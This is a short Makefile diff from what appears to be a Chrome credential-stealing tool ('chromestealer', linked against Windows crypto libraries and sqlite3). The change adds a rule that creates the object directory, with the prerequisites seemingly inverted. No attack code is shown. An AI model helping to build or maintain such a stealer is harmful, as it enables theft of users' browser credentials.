@@ -8,8 +8,11 @@ LDFLAGS = -lShlwapi -lCrypt32 -lbcrypt
 
 all: chromestealer
 
-chromestealer: $(OBJS)
+chromestealer: $(OBJ) | $(OBJS)
 	$(CC) $(CFLAGS) $(OBJS) $(LDFLAGS) -o chromestealer
+
+$(OBJ):
+	mkdir $(OBJ)
 
 $(OBJ)/sqlite3.o: $(LIB)/sqlite3.c
 	$(CC) $(CFLAGS) -c lib/sqlite3.c -o $@
